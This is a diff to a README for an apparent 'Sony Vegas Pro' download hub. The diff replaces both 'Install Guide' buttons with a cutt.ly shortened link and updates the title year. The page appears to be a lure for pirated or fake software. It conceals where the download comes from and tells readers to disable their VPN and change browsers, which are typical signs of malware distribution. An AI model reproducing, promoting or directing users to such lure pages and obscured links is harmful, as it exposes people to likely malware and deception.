@@ -1,11 +1,11 @@
-# 🎥 Sony Vegas Pro 2025 Video Creation Hub  
+# 🎥 Sony Vegas Pro 2026 Video Creation Hub  
 
 ![Sony Vegas Pro 2025 Banner](https://i.ytimg.com/vi/8atsbIhSeVU/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLB1bHd1aqWabrkVa5MqHX3pHI513w)  
   
 
 **Description**: Unleash your video editing potential with **Sony Vegas Pro 2025**, a premium tool packed with AI innovations! This repository offers tutorials, resources, and tips to explore Vegas Pro’s new features like Auto Reframe and Motion Tracking for stunning video content. Start with accessible editing solutions and join our thriving community of creators in 2025!  
 
-<a href="https://videocraftmasterhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/IrNtQAYv" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -32,7 +32,7 @@ Elevate your video skills with these straightforward steps to get Sony Vegas Pro
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother process.  
 
-<a href="https://videocraftmasterhub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/IrNtQAYv" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
